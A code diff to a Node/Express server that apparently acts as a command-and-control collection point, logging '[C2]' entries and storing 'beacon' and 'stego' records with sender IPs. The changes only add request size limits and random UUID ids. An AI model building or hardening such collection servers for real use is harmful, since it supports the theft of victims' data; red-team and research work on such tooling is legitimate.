@@ -10,6 +10,7 @@ const cors = require('cors')
 const rateLimit = require('express-rate-limit')
 const path = require('path')
 const fs = require('fs').promises
+const crypto = require('crypto')
 
 const app = express()
 const PORT = process.env.PORT || 8080
@@ -98,9 +99,8 @@ function sanitizeBody(raw) {
 
 // Middleware
 app.use(cors())
-app.use(express.json())
-app.use(express.urlencoded({ extended: true }))
-
+app.use(express.json({ limit: '10kb' }))
+app.use(express.urlencoded({ extended: true, limit: '10kb' }))
 // Ensure data directory
 async function ensureDataDir() {
   try { await fs.mkdir(DATA_DIR, { recursive: true }) } catch (e) { /* exists */ }
@@ -129,7 +129,7 @@ app.post('/collect', collectLimiter, async (req, res) => {
   console.log(`[C2]   Source: ${safeSource}`)
 
   const record = {
-    id: `stego-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+    id: `stego-${crypto.randomUUID()}`,
     timestamp: ts,
     ip: req.ip || req.connection.remoteAddress,
     userAgent: String(req.get('user-agent') || '').replace(/[\x00-\x1f\x7f\\"'`<>]/g, '').slice(0, 512),
@@ -196,7 +196,7 @@ app.get('/collect', collectLimiter, async (req, res) => {
         if (parsed) {
           const sanitizedData = sanitizeBody(parsed)
           const record = {
-            id: `beacon-${Date.now()}`,
+            id: `beacon-${crypto.randomUUID()}`,
             timestamp: new Date().toISOString(),
             data: sanitizedData
           }
